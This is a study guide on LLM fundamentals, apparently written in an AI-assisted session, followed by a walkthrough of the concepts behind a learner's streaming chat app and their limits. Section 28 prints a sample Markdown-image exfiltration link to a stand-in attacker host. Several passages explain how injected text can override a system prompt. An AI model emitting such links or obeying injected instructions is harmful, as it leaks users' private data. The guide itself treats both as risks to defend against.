# AI Theory

The theory behind what you're building, written in a Claude session on 2026-11-01, after you built Phase 1's chat app. [ROADMAP.md](ROADMAP.md) tracks progress and [GUIDE.md](GUIDE.md) explains the tools; this file explains the ideas.

- **Part 1** is AI theory only: what AI, LLMs and tokens are, how a model runs, and how it's trained.
- **Part 2** goes concept by concept through what you built in Phases 0–1: a real-world example, the problem it solves, its limitation, and the phase that fixes it.

File and line references in Part 2 are from 1 Nov. Since then, context window management and auto-titles were built (3 Nov), so some of its "solved later" notes for Phase 1 are already done.

**Contents:** [Part 1 — How AI and LLMs work](#part-1--how-ai-and-llms-work) · [Part 2 — The theory behind what you built](#part-2--the-theory-behind-what-you-built-phases-01)

---

## Part 1 — How AI and LLMs work

Everything you've done so far is **inference**, which means using a model someone else already trained. You haven't trained a model yet; that starts in Phases 6–7. For the size examples below, I use Llama 3.1 8B, the model you ran locally.

### 1. What AI is

```text
AI: software that does tasks we link with intelligence
└─ Machine learning: learns patterns from data
   └─ Deep learning: uses neural networks with many layers
      └─ Generative AI: creates new content
         └─ LLM: generates text one token at a time
```

- **Normal programming:** you write the rules. For example, `if email contains "lottery", mark as spam`.
- **Machine learning:** you give examples and answers, and training finds the patterns.
- **Neural network:** many simple math operations connected in layers, controlled by learned numbers called **weights**.

### 2. What an LLM is

LLM means **Large Language Model**:
- **Large:** it has many weights, and "8B" means about 8 billion.
- **Language:** it was trained on text.
- **Model:** a math function plus its learned weights.

Its core job is simple: given some tokens, it predicts the next one.

```text
Input:  The capital of France is
Output: " Paris" 92%, " located" 3%, " a" 1%, ... (example numbers)
```

Generating a reply is that prediction repeated many times. A model has two main parts:
- **Architecture:** the recipe for how the math is connected.
- **Weights:** the billions of numbers learned during training.

An LLM isn't a database of sentences. Its knowledge is spread across the weights as compressed patterns, and that compression is lossy, so it can produce confident answers that are wrong.

### 3. What a token is

A token is the unit of text a model reads and writes, and it can be a word, part of a word, or punctuation. For example, `Unbelievable!` became `Un`, `bel`, `ievable`, `!` with `o200k_base`.

A **tokenizer** converts text into token IDs and back. A common training method is **BPE (byte pair encoding)**:
1. Start with small pieces, such as bytes.
2. Find the pair that appears together most often.
3. Merge that pair into a new token.
4. Repeat until the vocabulary reaches its target size.

Llama 3.1 has a vocabulary of about 128,000 tokens. A token ID is only a label, so ID 500 isn't "more" than ID 400. Each model family has its own tokenizer, so token counts differ between models.

### 4. How meaning is stored: embeddings

An **embedding** is a list of numbers that represents a token. In Llama 3.1 8B, each token has 4,096 numbers.

The embedding table alone holds about 525 million weights (128,256 tokens × 4,096 numbers). Nobody writes these by hand. Training moves tokens used in similar ways closer together, so "doctor" and "nurse" tend to end up nearer than "doctor" and "bicycle".

### 5. How an LLM is organized

Most modern LLMs use the **transformer** architecture:

```text
"The cat sat"
   ↓ Tokenizer
Token IDs
   ↓ Embedding table
One vector for each token
   ↓ Transformer block 1: attention + feed-forward
   ↓ Transformer block 2
   ↓ ...
   ↓ Transformer block 32 in Llama 3.1 8B
   ↓ Output layer
One score for every token in the vocabulary
   ↓ Softmax
Probabilities for the next token
```

- **Attention:** each token gathers information from earlier tokens. In "The animal didn't cross the street because it was tired", attention helps connect "it" to "animal". Change "tired" to "wide", and "it" points to "street".
- **Multi-head attention:** several attention operations run side by side, so the model can track different relationships at once.
- **Feed-forward layer:** it processes each token's vector after attention has added context.
- **Residual connections and normalization:** they keep signals stable so very deep models can train.
- **Causal mask:** it stops a token from seeing later tokens, so the model can't cheat during training.
- **Mixture of experts:** used by gpt-oss. A router activates only some of the expert sub-networks for each token, so a very large model can run with less compute per token.

### 6. How an LLM gets called

When you send a request, this happens on the model side:
1. **Admission:** the provider checks your limits and queues the request.
2. **Chat template:** your roles and messages are flattened into one text sequence with special markers. This is why "hello" used 86 prompt tokens on gpt-oss and 27 on Llama.
3. **Tokenizing:** the text becomes token IDs.
4. **Forward pass:** the IDs move through the transformer, producing next-token probabilities.
5. **Sampling:** one token is chosen.
6. **Loop:** that token is added to the sequence, and the model predicts the next one.
7. **Stop:** generation ends at an end token (`stop`) or at the token limit (`length`).
8. **Decoding:** token IDs are turned back into text and streamed to you.

**Sampling settings** change how the token is chosen:
- **Temperature:** changes how spread out the probabilities are. A word at 60% with T = 1 might become 83% at T = 0.5 or 43% at T = 2.
- **Top-k:** only considers the k most likely tokens.
- **Top-p:** only considers the most likely tokens that together reach a set probability.

**Reasoning** uses the same process. Reasoning tokens are ordinary generated tokens in a hidden channel, which is why they count as output and can use up the limit, as in your 2,046-token test.

### 7. How it runs on hardware

An LLM is mostly huge matrix multiplications, and GPUs are good at those because they do many calculations in parallel. The weights must be in memory, and generating each token reads most of them.

**Quantization** stores weights with fewer bits:

| Precision | Memory for 8 billion weights |
|---|---|
| 16-bit | About 16 GB |
| 4-bit | About 4 GB (about 5 GB in practice) |

Quality can drop a little, but the model becomes small enough to fit on your Mac.

This also helps explain your speed results:
- **Local speed:** a rough rule is memory bandwidth ÷ model size. A base M5 has about 150 GB/s, and the model is about 5 GB, which gives about 30 tokens/sec. You measured about 25.
- **Groq speed:** its LPU chips are built specifically for this kind of workload, which helps explain your 500–960 tokens/sec.
- **Cold start:** your first local reply took 2.57 s because the weights had to load into memory first.

Three more ideas connect here:
- **KV cache:** stores attention results for earlier tokens, so the model doesn't recompute them for every new token.
- **Prompt caching:** reuses that kind of work when a new request starts with exactly the same tokens, which is why it can cost less.
- **Output price:** input tokens are processed in parallel, but output needs a step per token. That's one main reason output usually costs more.

### 8. How an LLM is trained

#### Step 1: Collect and prepare data
Builders collect large amounts of text and code, clean it, remove duplicates, and tokenize it.

#### Step 2: Pretraining
This is where the model learns language patterns. The text provides its own answers:

```text
Input:  The  cat  sat  on   the
Target: cat  sat  on   the  mat
```

The weights start out random, so the first outputs are nonsense. Then this loop repeats a huge number of times:
1. **Forward pass:** the model predicts the next tokens.
2. **Loss:** a score measures how wrong it was. With cross-entropy, 90% on the right token gives a loss of 0.105, while 1% gives 4.6.
3. **Backpropagation:** this calculates how each weight affected the error.
4. **Optimizer:** this changes every weight slightly in the direction that lowers the loss.

Imagine walking down a hill in fog: you can only feel the slope under your feet, so you keep taking small steps downhill. Nobody programs grammar or facts directly; those patterns emerge because they help predict text.

A pretrained model only continues text. Asked "What is the capital of France?", it might reply with another quiz question, because that's a likely continuation.

#### Step 3: Instruction tuning
The model trains on instruction-and-response examples, so it learns to answer instead of only continuing text.

#### Step 4: Preference tuning
People or other models compare answers, then methods such as **RLHF** or **DPO** push the model toward the preferred ones. This shapes helpfulness, tone, and refusals.

#### Step 5: Reasoning training (for some models)
A common method rewards correct final answers on checkable problems, which can encourage useful step-by-step reasoning.

#### Step 6: Evaluation and release
Builders test quality and safety, then release the weights or offer the model through an API.

#### Training vs inference

| | Training | Inference |
|---|---|---|
| **Goal** | Change the weights | Use the weights |
| **Direction** | Forward and backward | Forward only |
| **Weights** | Change | Stay fixed |
| **Your work so far** | Not yet | Everything |

Large-scale training is very expensive. Meta reported using over 16,000 H100 GPUs for Llama 3.1 405B.

**Overfitting** is when a model memorizes its training data but does worse on new data. You catch it by watching **validation loss** on data held out from training: if training loss falls while validation loss rises, the model is memorizing.

### 9. How you can train an LLM locally

"Training an LLM" can mean three different things:

| Option | On your 16 GB Mac? | Result |
|---|---|---|
| **Train a mini-GPT from scratch** | Yes | Best for learning; it imitates a style but isn't a useful assistant |
| **Fine-tune a small open model** | Yes, starting small | Can be useful for one narrow task |
| **Train a real LLM from scratch** | No | Needs huge datasets and GPU clusters |

#### Option A: Train a mini-GPT
1. Choose at least about 1 MB of text.
2. Build a tokenizer, starting with one token per character.
3. Keep about 90% for training and 10% for validation.
4. Start small, such as 4–6 blocks, embeddings of 128–384 numbers, and a context of 64–256 tokens.
5. Train with PyTorch on your Mac's GPU, and track both losses.
6. Generate samples, then change one setting at a time.

A quick check: with 65 possible characters, an untrained model should start with a loss near ln(65) ≈ 4.17. If it starts far from that, something is probably wrong.

Expect text in the style of your data, not reliable facts or good answers. Depending on size, training can take minutes to a few hours (my estimate). Phase 6 covers this.

#### Option B: Fine-tune with LoRA
Instead of changing all the weights, **LoRA** freezes the model and trains small add-on matrices. For a 4,096 × 4,096 matrix:
- **Full matrix:** about 16.8 million numbers.
- **LoRA at rank 16:** 131,072 numbers, under 1% as many.

The process:
1. Choose a narrow task you can check, such as extraction into fixed JSON.
2. Create 500–2,000 good input-and-output examples.
3. Split them into training, validation, and test sets.
4. Measure a baseline first, using the same small model with a good prompt.
5. Train the adapter. **MLX** (`mlx-lm`) runs on your Mac, while **Unsloth** on free Colab, which your roadmap uses, gives you a GPU.
6. Compare against the baseline on the test set.
7. Merge the adapter, export the model, and run it in Ollama. MLX has its own export steps, and your roadmap uses GGUF.

On 16 GB, start with a 1–3B model, because an 8B model may be tight (my estimate). Fine-tuning is good for changing behavior and format, but it's a weak way to add facts. For facts, use RAG.

### 10. Why LLMs behave the way they do

| Behavior | Theory behind it | What solves it |
|---|---|---|
| **Forgets earlier chats** | Weights don't change during inference, and each call is separate | Resending context, summaries, and memory (Phases 1, 5) |
| **Has a context limit** | Each request can only hold so many tokens, and longer contexts need more compute and memory | Sliding windows, summaries, and retrieval (Phases 1, 3) |
| **Makes things up** | It's trained to predict likely text, and its knowledge is lossy | RAG, citations, and evals (Phase 3) |
| **Doesn't know recent or private facts** | Its knowledge comes from training data | RAG and tools (Phases 3–4) |
| **Struggles to count words or letters** | It sees tokens, not letters or words | Tools that count, or code (Phase 4) |
| **Gives different answers to the same prompt** | Sampling involves probability | Lower temperature and repeated evals (Phases 1, 3) |
| **Follows instructions hidden in a document** | Instructions and data all become one token stream | Least-privilege tools and injection defenses (Phases 4–5) |
| **Can't take actions by itself** | It only outputs tokens | Tool calling and agents (Phase 4) |
| **Needs a lot of memory** | Most weights are read for each token | Quantization and better serving (Phase 7) |

Together, the whole path looks like this:

```text
Training:  data → tokens → prediction → loss → weight updates → trained model
Inference: messages → template → tokens → model → sampling → next token → repeat → text
```

---

## Part 2 — The theory behind what you built (Phases 0–1)

### How an LLM call works

#### 1. LLM: a next-token predictor
It takes text in, gives a probability for every possible next token, picks one, and repeats.
- **Example:** your phone keyboard suggests the next word. An LLM does the same thing with a far larger model.
- **Problem it solves:** it can write replies, summaries, and code without hand-written rules.
- **Limitation:** it predicts what sounds likely, not what is true. Asked about your company's refund policy, it can invent one, which is a hallucination. It also can't learn from your chats, because its weights are fixed after training.
- **Solved later:** RAG supplies real documents (Phase 3), tools let it look things up (Phase 4), evals measure errors (Phase 3), and you build one yourself (Phase 6).

#### 2. Tokens
A token is the unit of text the model reads and you pay for.

| Text | Characters | Tokens (`o200k_base`) |
|---|---|---|
| `The quick brown fox jumps over the lazy dog.` | 44 | 10 |
| `Unbelievable!` | 13 | 4 (`Un`, `bel`, `ievable`, `!`) |
| `for i in range(10): print(i * 2)` | 32 | 13 |
| `{"vendor": "Acme", "total": 42.5, "paid": true}` | 47 | 20 |
| Three emoji | 3 | 5 |
| A short Hindi sentence | 23 | 9 |

- **Example:** a JSON-heavy prompt costs more than the same number of characters in plain English.
- **Problem it solves:** models need numbers from a fixed vocabulary. Single characters make sequences too long, and whole words can't cover every possible word.
- **Limitation:** counts differ between models, and tiktoken is only approximate for Llama. The model also sees tokens rather than words, which is why your "exactly 200 words" test used 2,046 reasoning tokens.
- **Solved later:** count tokens before each call (Phase 1), and build a BPE tokenizer (Phase 6).

#### 3. Stateless model and chat memory
The model remembers nothing between calls. "Memory" is your code resending the whole conversation.
- **Example:** imagine a doctor who forgets you after every visit, so you bring your full file each time. Clearing `messages` is like losing that file.
- **Problem it solves:** any server can handle any request, and your app controls exactly what the model sees.
- **Limitation:** the file keeps growing, and you measured 86 → 106 → 131 prompt tokens in three turns.
    - If each turn added 300 tokens (my assumption), turn 40 would send 11,786 tokens.
    - The whole chat would send about 237,000 input tokens, or about $0.018 at your `gpt-oss-20b` price.
    - At 10,000 such chats a day, that's about $178 a day.
    - Ollama's 4,096-token default would fill in about 13 turns, and your README notes that it then drops old messages without an error.
- **Solved later:** sliding window and summaries (next in Phase 1), then prompt caching, compaction, and long-term memory (Phase 5).

#### 4. Roles and the system prompt
`system` sets behavior, `user` is the person, and `assistant` is the model's earlier replies.
- **Example:** a new employee follows a handbook (system) while answering a customer (user). A bank bot's system prompt might say to answer only account questions.
- **Problem it solves:** it keeps standing instructions separate from each new message.
- **Limitation:** each model's chat template flattens the roles into one token stream, which is partly why "hello" cost 86 tokens on gpt-oss and 27 on Llama. Because of that, the system prompt isn't a security boundary, and text from a user or document can override it. This is prompt injection.
- **Solved later:** prompt lab (Phase 1), injection test (Phase 4), and defenses (Phase 5).

#### 5. Temperature
Temperature reshapes the next-token probabilities before one is picked.

| Next word | T = 0.5 | T = 1 | T = 2 |
|---|---|---|---|
| doing | 82.8% | 60.0% | 42.7% |
| practice | 14.4% | 25.0% | 27.6% |
| teaching | 2.3% | 10.0% | 17.4% |
| failing | 0.6% | 5.0% | 12.3% |

- **Example:** use a low value for extracting invoice fields and a higher one for brainstorming names.
- **Problem it solves:** it lets you choose between consistency and variety.
- **Limitation:** it controls randomness, not truth, so a low temperature can repeat the same wrong answer. Your Phase 1 app doesn't set it, so it uses the provider's default.
- **Solved later:** test settings on scored inputs (Phases 1 and 3), and write the sampling code yourself (Phase 6).

#### 6. Streaming
The reply is sent piece by piece as it's generated.
- **Example:** seeing a friend type feels very different from 30 seconds of silence. At your local 25 tokens/sec, a 500-token reply takes 20 seconds, but text appears right away.
- **Problem it solves:** it reduces how long the wait feels.
- **Limitation:** the total time doesn't change, and you can't check text the user has already seen. Partial JSON is hard to parse, and token usage only arrives at the end. Your `chat.py` timer also records when the stream opens, not the true first token.
- **Solved later:** time-to-first-token tracking and output checks (Phase 5).

#### 7. Usage and cost
Cost = (input tokens × input price + output tokens × output price) ÷ 1,000,000.
- **Example:** it works like a taxi meter. With 131 input and 50 output tokens on `gpt-oss-20b`, one turn costs about $0.0000248. At your listed prices, output costs four times as much as input.
- **Problem it solves:** a popular feature can lose money without anyone noticing.
- **Limitation:** you only know the cost after the call. Hard-coded prices can go stale, and `pricing.py` ignores the cached-token discount, so it can overstate cost.
- **Solved later:** count tokens before calling (Phase 1), then caching, dashboards, and spend caps (Phase 5).

#### 8. Reasoning tokens and `finish_reason`
Reasoning models write hidden thinking before the answer, and `finish_reason` says why generation ended: `stop` means finished, and `length` means it hit the limit.
- **Example:** a student spends the whole exam on rough work and never writes the answer. That's what happened in your 2,048-token test.
- **Problem it solves:** reasoning improves multi-step problems, and `finish_reason` reveals cut-off replies.
- **Limitation:** reasoning is billed as output and looks like silence to the user. `finish_reason` isn't saved in your database, so the "Cut off" warning disappears after a reload.
- **Solved later:** compare low and high effort (Phase 1 prompt lab), and route easy and hard queries (Phase 5). Saving `finish_reason` isn't on your roadmap, but it's a small addition.

#### 9. Hosted vs local models
Groq runs models on its servers, while Ollama runs a compressed model on your Mac.
- **Example:** a public chatbot may use a hosted model for speed, while a hospital may run one locally so patient notes stay in-house.
- **Problem it solves:** you can choose between speed and scale, or privacy and no per-token bill.
- **Limitation:**
    - **Your measurements:** Groq reached about 500–960 tokens/sec, against about 25 locally. Once loaded, the local model opened the stream faster (0.12 s vs 0.49–0.81 s), but it took 2.57 s to load after being idle.
    - **Hosted:** data leaves your machine, rate limits apply, and models can be removed.
    - **Local:** one Mac can't serve many users, and a deployed backend can't reach your `localhost`.
- **Solved later:** fallback from Groq to Ollama (Phase 5), then quantization, GPU serving with vLLM, and a break-even calculation (Phase 7).

#### 10. OpenAI-compatible APIs
Many providers accept the same request format, so changing `base_url` switches provider.
- **Example:** USB-C lets one port work with many devices.
- **Problem it solves:** you avoid rewriting your app for each provider.
- **Limitation:** only the shared features are portable. You already special-case `reasoning_effort` in `phase-1-chat-app/backend/app/llm.py:18`, and tool-calling quality varies between models.
- **Solved later:** run the agent loop on Ollama and see where it breaks (Phase 4), then put providers behind one interface (Phase 5).

#### 11. Comparing models
No model is best at everything, so you trade off quality, speed, and cost.
- **Example:** you might give an intern simple sorting work and a senior engineer the hard problems.
- **Problem it solves:** you stop paying for a large model on easy tasks.
- **Limitation:** five questions give an impression, not proof, and those results aren't recorded yet.
- **Solved later:** scored prompt lab (Phase 1), golden-set evals (Phase 3), and model routing (Phase 5).

#### 12. Rate limits and 429
Providers cap requests and tokens per minute and per day. Going over returns HTTP 429, often with a `retry-after` header.
- **Example:** a toll booth lets only so many cars through each minute.
- **Problem it solves:** it protects shared hardware and keeps usage fair.
- **Limitation:** `llm.py` sets `max_retries=0`, so users see the error instead of an automatic retry. Your app does at least show the wait time. Blind instant retries can make things worse if every client retries together.
- **Solved later:** rate handling in ingestion (Phase 2), backoff and cached judge results (Phase 3), and backoff, fallback, and per-user limits (Phase 5). Your two unfinished Phase 0 items cover this, so do them before Phase 2.

#### 13. API keys and `.env`
Secrets stay outside the code and are read when the program runs.
- **Example:** you don't tape your house key to the front door. A key pushed to a public repo can be found and used on your account.
- **Problem it solves:** code can be public while the key stays private. I checked your repo: no `.env` file is tracked, and no Groq-style key appears in its Git history.
- **Limitation:** `.env` is still plain text on disk, and a key that gets committed stays in Git history until you rewrite it, so you'd need to replace the key.
- **Solved later:** host environment variables (Phase 1 deployment), plus CI secrets and log redaction (Phase 5).

### Python tools

#### 14. uv, virtual environments, and lockfiles
Each project gets its own Python and packages, with exact versions recorded.
- **Example:** each job has its own toolbox, plus a parts list that lets someone rebuild the same box.
- **Problem it solves:** it prevents "works on my machine". You pinned Python 3.12 because ML libraries usually support new Python versions late.
- **Limitation:** it doesn't capture your OS, GPU drivers, or services such as Postgres.
- **Solved later:** Docker with pgvector (Phase 2), and PyTorch device setup (Phase 6).

#### 15. Comprehensions, f-strings, and slicing
These are short ways to transform lists, build strings, and take parts of a list.
- **Example:** `phase-1-chat-app/backend/app/routers/chat.py:33` turns database rows into role-and-content messages. `history[-10:]` will become your sliding window.
- **Problem it solves:** common data work takes less code.
- **Limitation:** long comprehensions get hard to read. More importantly, SQL has `%s` placeholders to separate data from commands, as in your `repository.py`, but prompts have no true equivalent. An f-string with user text in a prompt is therefore open to injection.
- **Solved later:** XML-tagged sections (Phase 1), and separating untrusted content (Phase 5).

#### 16. Type hints, dataclasses, and Pydantic
Type hints describe data, dataclasses give it a simple structure, and Pydantic checks it at runtime.
- **Example:** a name tag says who someone claims to be, while a security guard checks. `ChatRequest` makes FastAPI reject an empty message.
- **Problem it solves:** bad data gets stopped at the edge of your app.
- **Limitation:** it checks shape, not truth. An invoice with `total: 500` can be valid and still wrong.
- **Solved later:** `/extract` with validation retries (Phase 1), and correctness evals (Phase 3).

#### 17. `async` and `await`
One thread handles many tasks by switching whenever one is waiting.
- **Example:** one waiter can serve many tables because most of the time goes to waiting on the kitchen. LLM calls are mostly network waiting too.
- **Problem it solves:** many slow streams can run without one thread per user.
- **Limitation:** it only helps while waiting. CPU-heavy or blocking work freezes every other request on that thread.
- **Solved later:** this becomes real with local embeddings in Phase 2. Run bulk work in your ingestion script, and move query embedding to a worker thread if it blocks the API.

#### 18. Generators and `yield`
A generator produces one value, pauses, and continues when asked for the next.
- **Example:** a tap gives water as you need it, while a bucket must fill first. Your chain is SDK stream → `llm.stream_chat` → `events()` → `StreamingResponse`.
- **Problem it solves:** data flows as it's produced, without waiting for the whole reply.
- **Limitation:** it runs once and can't rewind. It can also fail after partial output was sent, and cleanup must go in `finally`.
- **Solved later:** the same pattern streams agent steps to your UI (Phase 4), and reliability work handles more failures (Phase 5).

#### 19. Jupyter
Notebooks run code in cells and keep variables in memory.
- **Example:** it's a lab notebook, with the experiment and its result side by side.
- **Problem it solves:** you can try things quickly without rerunning everything.
- **Limitation:** running cells out of order creates hidden state, and notebooks are hard to review, test, and deploy. You haven't committed one yet.
- **Solved later:** prompt lab and embedding notebooks (Phases 1–2), then a repeatable `eval.py` (Phase 3) and CI (Phase 5).

### Backend

#### 20. FastAPI and Uvicorn
FastAPI maps HTTP routes to typed Python functions, and Uvicorn is the server that runs them.
- **Example:** a front desk checks each order and sends it to the right kitchen.
- **Problem it solves:** you get routing, validation, and API docs with little code.
- **Limitation:**
    - There's no login, and `repository.py:5` returns every conversation to anyone.
    - CORS only restricts browsers, so it doesn't replace authentication.
    - `phase-1-chat-app/backend/app/routers/chat.py:55` sends raw exception text to the client.
- **Solved later:** per-user limits and safer handling (Phase 5), and authentication (Phase 8).

#### 21. Server-sent events (SSE)
SSE is a one-way stream over normal HTTP. Your events look like `data: {"type":"token","text":"Hel"}`, followed by a blank line.
- **Example:** SSE is like a radio broadcast, WebSockets are a phone call, and polling is repeatedly asking "done yet?"
- **Problem it solves:** LLM text only flows from server to client, so SSE is simpler than WebSockets. JSON keeps newlines in tokens from breaking the format, and your headers discourage caching and proxy buffering.
- **Limitation:**
    - The `200` status goes out before the stream, so later failures need your in-band `error` event.
    - A dropped stream doesn't resume.
    - A proxy may close a connection that stays silent during long reasoning.
- **Solved later:** deployment will test this (Phase 1), and timeouts and reliability come in Phase 5. Heartbeat events aren't on your roadmap, but add them if deployed streams drop.

#### 22. Postgres schema
A conversation has many messages, and each message stores its tokens and cost.
- **Example:** a conversation is a folder, and messages are its pages.
- **Problem it solves:** history survives restarts, and you can query it.
    - Cascading deletes remove a conversation's messages with it.
    - The `CHECK` constraint blocks invalid roles.
    - The `(conversation_id, id)` index finds one chat's messages in order.
    - `NUMERIC` stores cost exactly.
- **Limitation:** there's no user ID, `finish_reason`, latency, or prompt version. `CREATE TABLE IF NOT EXISTS` also won't add new columns to an existing table.
- **Solved later:** pgvector in the same kind of database (Phase 2), tracing (Phase 5), and users (Phase 8). A migration tool such as Alembic isn't on your roadmap, but you'll need one when the schema changes.

#### 23. Connection pool and short transactions
A pool keeps database connections open and lends them out.
- **Example:** taxis wait at a stand, and you don't keep one parked outside during a long meeting. `routers/chat.py:24` returns the connection before streaming starts.
- **Problem it solves:** opening connections is slow. With the installed pool's default of 4, holding them during streams would make the fifth user wait.
- **Limitation:** the pool is still fixed in size, and each app instance has its own pool against a shared database limit.
- **Solved later:** deployment on managed Postgres (Phase 1) and monitoring (Phase 5) will show when tuning is needed. Pool load testing isn't on your roadmap.

#### 24. Loading history on each request
The database is the source of truth, not the browser or the server's memory.
- **Example:** a bank teller at any branch can pull up your account.
- **Problem it solves:** refreshes are safe, clients can't fake past messages, and any backend instance can handle the request.
- **Limitation:** it loads and sends everything, with no limit.
- **Solved later:** token counting, sliding window, summaries, and the 40-turn test (Phase 1), then compaction and memory (Phase 5).

#### 25. Model choice per conversation
Each chat stores a model, `known_model` allows only listed models, and `provider_for` picks Groq or Ollama.
- **Example:** you can only order what's on the menu.
- **Problem it solves:** you balance cost against quality, and clients can't request models you don't offer.
- **Limitation:** users have to choose well themselves. Switching mid-chat keeps the old model's replies in the history, and Ollama won't be available from a hosted backend pointing at `localhost`.
- **Solved later:** evals (Phase 3), automatic routing (Phase 5), and self-hosted serving (Phase 7).

### Frontend

#### 26. Reading the stream by hand
`fetch` plus `getReader()` receives raw bytes, and your buffer rebuilds complete events from them.
- **Example:** a letter arrives torn into random pieces, so you wait for a full sentence before reading it. One network read can hold half an event or three events.
- **Problem it solves:** `EventSource` only supports GET, and your endpoint uses POST. `TextDecoder` with `stream: true` also keeps Hindi or emoji intact when a character is split across reads.
- **Limitation:** your parser handles only `data:` lines, and it doesn't reconnect after a drop.
- **Solved later:** agent step events reuse this path (Phase 4). The Vercel AI SDK in your guide can hide this work once you understand it.

#### 27. Rendering tokens live
`useChat` adds an empty assistant message and then appends each token to it.
- **Example:** a live scoreboard updates as play happens.
- **Problem it solves:** users get immediate feedback. Functional state updates (`prev => ...`) also prevent stale state.
- **Limitation:** each token can trigger a re-render and a new Markdown parse, so long replies get heavier. `Chat.tsx:41` also scrolls to the bottom on every update, which pulls the user down while they're reading older text.
- **Solved later:** this isn't on your roadmap. If replies lag, batch updates once per animation frame and only auto-scroll when the user is already at the bottom.

#### 28. Markdown and code blocks
`react-markdown` converts the model's Markdown into React elements.
- **Example:** users see real tables and highlighted code, not raw `**` and backticks.
- **Problem it solves:** replies become readable. You don't use `rehype-raw`, so raw HTML in a reply isn't rendered as live HTML.
- **Limitation:** half-finished Markdown can flicker during streaming. Images are the bigger risk: injected text could make the model output `![x](https://evil.example/?data=secret)`, and the browser would request that URL. This matters once the app handles private data and untrusted documents.
- **Solved later:** injection test (Phase 4), plus output checks and the OWASP review (Phase 5). Add an image-domain allowlist as part of that work.

#### 29. Sidebar and new chat
Conversations are sorted by latest activity, and a new one is created only when you send the first message.
- **Example:** a messaging app shows the most recent threads first.
- **Problem it solves:** separate chats keep topics from mixing in the model's context, and you avoid empty conversations.
- **Limitation:** titles are just the first 40 characters, and the list has no search, pagination, or owner.
- **Solved later:** auto-titles (next in Phase 1), search skills you can reuse here (Phase 2), and users (Phase 8).

#### 30. Stop button and saving partial replies
`AbortController` closes the connection, the server cancels your generator, and `finally` runs. `CancelScope(shield=True)` protects the database save from that cancellation.
- **Example:** if you cancel a food order halfway through cooking, you may still pay for what was already made.
- **Problem it solves:** users stop a bad answer early and keep the text they already saw.
- **Limitation:**
    - The usage data comes at the end of the stream, so stopped replies are saved with no tokens or cost, and your total undercounts them.
    - The partial reply goes back to the model in later turns.
    - Stopping before the first token leaves a user message with no reply.
- **Solved later:** context management (Phase 1) and tracing and cost tracking (Phase 5). Estimating stopped-reply tokens with a tokenizer isn't on your roadmap, but it would close this gap.

#### 31. Token and cost display
Each reply shows its model, tokens, and cost, and the header shows the total.
- **Example:** a taxi meter in view of the passenger changes how you think about the ride.
- **Problem it solves:** the growing cost of long chats becomes visible while you build.
- **Limitation:** it reports cost but doesn't control it, and it only shows the loaded chat, not your total spend. It also shows no counts for stopped or failed replies.
- **Solved later:** dashboards, per-user spend caps, and task budgets (Phases 4–5).

### How the limitations lead to your next phases

| What your app can't do yet | Why | Where you solve it |
|---|---|---|
| Handle long chats safely | The whole history is sent every time | Phase 1, next |
| Return reliable structured data | Nothing forces the output into your schema | Phase 1 |
| Search by meaning | It has no embeddings or search index | Phase 2 |
| Answer from your documents | The model only knows its training data and the prompt | Phase 3 |
| Prove answers are good | You have no golden set or scoring | Phase 3 |
| Take actions | It can only generate text | Phase 4 |
| Survive real production use | It has no retries, tracing, spend limits, or defenses | Phase 5 |
| Explain the model's internals | You've only used it through an API | Phases 6–7 |
| Support real users | It has no login or data ownership | Phase 8 |

The prices above come from your `pricing.py` and weren't checked against Groq's current pricing.
